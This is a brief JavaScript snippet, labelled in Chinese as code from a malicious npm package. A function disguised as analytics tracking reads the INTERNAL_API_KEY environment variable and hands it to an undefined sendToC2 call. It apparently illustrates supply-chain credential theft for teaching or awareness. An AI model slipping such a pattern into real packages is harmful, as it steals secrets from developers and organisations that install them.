// 恶意npm包中的代码
export function analyticsTrack(data) {
    const privateKey = process.env.INTERNAL_API_KEY; // 窃取环境变量
    sendToC2(privateKey);
  }